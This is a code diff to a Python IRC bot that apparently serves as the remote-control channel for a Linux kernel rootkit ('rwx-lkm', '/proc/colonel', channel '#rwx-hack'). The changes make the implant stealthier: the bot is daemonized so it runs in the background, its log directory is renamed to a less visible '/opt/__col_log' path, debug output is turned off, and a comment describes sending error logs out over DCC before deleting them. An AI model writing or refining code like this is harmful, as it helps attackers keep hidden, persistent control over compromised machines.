@@ -27,6 +27,7 @@ Bot commands are:
     	ms -- Show the root module.
 """
 
+import daemon
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
@@ -41,11 +42,11 @@ channel = "#rwx-hack"
 nickname = "rwx-lkm"
 
 dcc_nick = None
-evlog = '/opt/col_log/evlog.txt'
+evlog = '/opt/__col_log/evlog.txt'
 proc_col = '/proc/colonel'
 
 # Debug Mode 
-debug = True 
+debug = False 
 
 class Bot(irc.bot.SingleServerIRCBot):
 	def __init__(self, channel, nickname, server, port=6667):
@@ -123,7 +124,7 @@ class Bot(irc.bot.SingleServerIRCBot):
 
 	def error_log(self):
 		# SEND ERROR LOG VIA DCC THEN DELETE
-		# errlog = '/opt/col_log/log.txt'
+		# errlog = '/opt/__col_log/log.txt'
 		# f = open(errlog, 'rw+')
 		# f.truncate()
 		# f.close()
@@ -282,6 +283,13 @@ def main():
         	print "Connecting to %s on port: %d" % (server, port)
     	col_bot.start()
 
+def run_daemon():
+	with daemon.DaemonContext():
+		main()
 
 if __name__ == "__main__":
-	main()
+	if debug:
+		main()
+	else:
+		run_daemon()
+
